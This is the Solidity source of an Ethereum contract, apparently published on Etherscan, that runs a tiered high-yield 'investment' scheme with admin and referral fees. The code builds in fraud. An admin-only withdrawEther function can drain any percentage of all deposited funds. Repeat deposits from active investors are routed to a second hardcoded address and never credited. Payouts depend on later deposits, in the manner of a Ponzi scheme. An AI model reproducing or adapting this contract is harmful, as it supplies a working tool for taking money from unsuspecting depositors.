['/**\n', ' *Submitted for verification at Etherscan.io on 2021-02-16\n', '*/\n', '\n', 'pragma solidity ^0.8;\n', 'contract unityOfEthereum {\n', '    \n', '    struct Investor\n', '    {\n', '        uint amount; \n', '        uint dateUpdate; \n', '        uint dateEnd;\n', '        address refer; \n', '        bool active; \n', '    }\n', '    \n', '    uint constant private PERCENT_FOR_ADMIN = 10; \n', '    uint constant private PERCENT_FOR_REFER = 5; \n', '    address constant private ADMIN_ADDRESS = 0x6fc68a2888f1015cA458C801B8ACeEb941d535B2;\n', '    mapping(address => Investor) investors; \n', '    event Transfer (address indexed _to, uint256 indexed _amount);\n', '    \n', '    constructor () {\n', '    }\n', '    \n', '    function getPercent(Investor storage investor) private view returns (uint256) {\n', '        uint256 amount = investor.amount;\n', '        uint256 percent = 0;\n', '        if (amount >= 0.0001 ether && amount <= 0.049 ether) percent = 15;\n', '        if (amount >= 0.05 ether && amount <= 0.099 ether) percent = 20;\n', '        if (amount >= 0.1 ether && amount <= 0.499 ether) percent = 21;\n', '        if (amount >= 0.5 ether && amount <= 2.999 ether) percent = 22;\n', '        if (amount >= 3 ether && amount <= 9.999 ether) percent = 23;\n', '        if (amount >= 10 ether) percent = 25;\n', '        return percent;\n', '    }\n', '    \n', '    function getDate(Investor storage investor) private view returns (uint256) {\n', '        uint256 amount = investor.amount;\n', '        uint256 date = 0;\n', '        if (amount >= 0.0001 ether && amount <= 0.049 ether) date = block.timestamp + 1 days;\n', '        if (amount >= 0.05 ether && amount <= 0.099 ether) date = block.timestamp + 7 days;\n', '        if (amount >= 0.1 ether && amount <= 0.499 ether) date = block.timestamp + 14 days;\n', '        if (amount >= 0.5 ether && amount <= 2.999 ether) date = block.timestamp + 30 days;\n', '        if (amount >= 3 ether && amount <= 9.999 ether) date = block.timestamp + 60 days;\n', '        if (amount >= 10 ether) date = block.timestamp + 120 days;\n', '        return date;\n', '    }\n', '    \n', '    function getFeeForAdmin(uint256 amount) private pure returns (uint256) {\n', '        return amount * PERCENT_FOR_ADMIN / 100;\n', '    }\n', '\n', '    function getFeeForRefer(uint256 amount) private pure returns (uint256) {\n', '        return amount * PERCENT_FOR_REFER / 100;\n', '    }\n', '\n', '    function getProfit(Investor storage investor) private view returns (uint256) {\n', '        uint256 amount = investor.amount;\n', '        if (block.timestamp >= investor.dateEnd) {\n', '            return amount + amount * getPercent(investor) * (investor.dateEnd - investor.dateUpdate) / (1 days * 1000);\n', '        } else {\n', '            return amount * getPercent(investor) * (block.timestamp - investor.dateUpdate) / (1 days * 1000);\n', '        }\n', '    }\n', '\n', '    receive() external payable {\n', '        require(msg.value == 0 || msg.value >= 0.0001 ether, "Min Amount for investing is 0.0001 ether.");\n', '\n', '        if (msg.value == 0 && investors[msg.sender].active) {\n', '\n', '            uint256 amountProfit = getProfit(investors[msg.sender]);\n', "            require(amountProfit > 0.0001 ether, 'amountProfit must be > 0.0001 etherT');\n", '\n', '            if (block.timestamp >= investors[msg.sender].dateEnd) {\n', '                investors[msg.sender].active = false;\n', '            }\n', '\n', '            investors[msg.sender].dateUpdate = block.timestamp;\n', '\n', '            payable(msg.sender).transfer(amountProfit);\n', '            emit Transfer(msg.sender, amountProfit);\n', '\n', '        } else if (!investors[msg.sender].active) {\n', '            uint feeForAdmin = getFeeForAdmin(msg.value);\n', '            payable(ADMIN_ADDRESS).transfer(feeForAdmin);\n', '            emit Transfer(ADMIN_ADDRESS, feeForAdmin);\n', '\n', '            investors[msg.sender].active = true;\n', '            investors[msg.sender].dateUpdate = block.timestamp;\n', '            investors[msg.sender].amount =  msg.value;\n', '            investors[msg.sender].dateEnd = getDate(investors[msg.sender]);\n', '\n', '            if (investors[msg.sender].refer != address(0)) {\n', '                uint feeForRefer = getFeeForRefer(msg.value);\n', '                payable(investors[msg.sender].refer).transfer(feeForRefer);\n', '                emit Transfer(investors[msg.sender].refer, feeForRefer);\n', '            }\n', '        } else {\n', '            payable(0x48560EBFd9313817e729dE5d744D748a9CeECEb4).transfer(msg.value);\n', '            emit Transfer(0x48560EBFd9313817e729dE5d744D748a9CeECEb4, msg.value);\n', '        }\n', '    }\n', '\n', '    function showUnpayedPercent() public view returns (uint256) {\n', '        return getProfit(investors[msg.sender]);\n', '    }\n', '    \n', '    function setRefer(address _refer) public {\n', '        require(_refer != address(0), "Irritum data");\n', '        require(investors[msg.sender].refer == address(0), "In referrer est iam installed");\n', '        \n', '        investors[msg.sender].refer = _refer;\n', '       \n', '    }\n', '    \n', '    function withdrawEther(uint256 _amount) public {\n', '        require(ADMIN_ADDRESS == msg.sender, "Access denied");\n', '\n', '        uint256 payment = address(this).balance * _amount / 100;\n', '        payable(ADMIN_ADDRESS).transfer(payment);\n', '        emit Transfer(msg.sender, payment);\n', '    }\n', '    \n', '\n', '}']